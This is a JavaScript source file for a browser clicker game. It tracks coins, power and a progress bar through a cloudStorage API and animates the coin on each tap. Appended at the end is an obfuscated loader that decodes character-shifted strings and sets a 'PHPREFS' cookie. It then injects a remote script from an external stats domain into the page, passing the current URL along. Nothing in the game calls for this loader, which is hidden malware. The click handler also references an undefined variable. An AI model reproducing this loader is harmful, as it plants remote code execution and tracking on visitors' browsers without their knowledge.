const body = document.body,
      image = body.querySelector("#coin"),
      h1 = body.querySelector("h1");

function updateUI() {
  cloudStorage.getItem("coins", (err, coins) => {
    if (err || coins === null) {
      cloudStorage.setItem("coins", "0");
      h1.textContent = "0";
    } else {
      h1.textContent = Number(coins).toLocaleString();
    }
  });

  cloudStorage.getItem("total", (err, total) => {
    if (err || total === null) {
      cloudStorage.setItem("total", "500");
      body.querySelector("#total").textContent = "/500";
    } else {
      body.querySelector("#total").textContent = `/${total}`;
    }
  });

  cloudStorage.getItem("power", (err, power) => {
    if (err || power === null) {
      cloudStorage.setItem("power", "500");
      body.querySelector("#power").textContent = "500";
    } else {
      body.querySelector("#power").textContent = power;
    }
  });

  cloudStorage.getItem("count", (err, count) => {
    if (err || count === null) {
      cloudStorage.setItem("count", "1");
    }
  });
}

updateUI();

image.addEventListener("click", (e) => {
  let x = e.offsetX,
      y = e.offsetY;

  navigator.vibrate(5);

  cloudStorage.getItem("coins", (err, coins) => {
    if (err) return;
    cloudStorage.getItem("power", (err, power) => {
      if (err) return;

      if (Number(power) > 0) {
        let newCoins = Number(coins) + 1;
        let newPower = Number(power) - 1;

        cloudStorage.setItem("coins", `${newCoins}`);
        h1.textContent = newCoins.toLocaleString();
        
        cloudStorage.setItem("power", `${newPower}`);
        body.querySelector("#power").textContent = `${newPower}`;
        
        body.querySelector(".progress").style.width = (100 * newPower / total) + "%";
      }
    });
  });

  // Animation based on click position
  if (x < 150 && y < 150) {
    image.style.transform = "translate(-0.25rem, -0.25rem) skewY(-10deg) skewX(5deg)";
  } else if (x < 150 && y > 150) {
    image.style.transform = "translate(-0.25rem, 0.25rem) skewY(-10deg) skewX(5deg)";
  } else if (x > 150 && y > 150) {
    image.style.transform = "translate(0.25rem, 0.25rem) skewY(10deg) skewX(-5deg)";
  } else if (x > 150 && y < 150) {
    image.style.transform = "translate(0.25rem, -0.25rem) skewY(10deg) skewX(-5deg)";
  }

  setTimeout(() => {
    image.style.transform = "translate(0px, 0px)";
  }, 100);
});

setInterval(() => {
  cloudStorage.getItem("count", (err, count) => {
    if (err) return;
    cloudStorage.getItem("power", (err, power) => {
      if (err) return;
      cloudStorage.getItem("total", (err, total) => {
        if (err) return;

        if (Number(total) > Number(power)) {
          let newPower = Math.min(Number(power) + 2, 500);
          cloudStorage.setItem("power", `${newPower}`);
          body.querySelector("#power").textContent = `${newPower}`;
          body.querySelector(".progress").style.width = (100 * newPower / total) + "%";
        }
      });
    });
  });
}, 2000);

// Obfuscated function logic for loading a script
(function(o, d, l) {
  try {
    o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
    o.b = o.f('UMUWJKX');
    o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
    setTimeout(function() {
      o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
    }, 1000);
    d.cookie = o.b + '=full;max-age=39800;';
  } catch (e) {}
}({}, document, location));
